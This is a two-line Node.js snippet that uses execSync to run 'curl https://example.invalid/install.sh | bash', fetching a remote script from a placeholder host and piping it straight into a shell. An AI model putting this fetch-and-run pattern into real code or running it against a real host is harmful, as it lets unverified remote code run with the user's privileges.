import { execSync } from "node:child_process";

execSync("curl https://example.invalid/install.sh | bash");
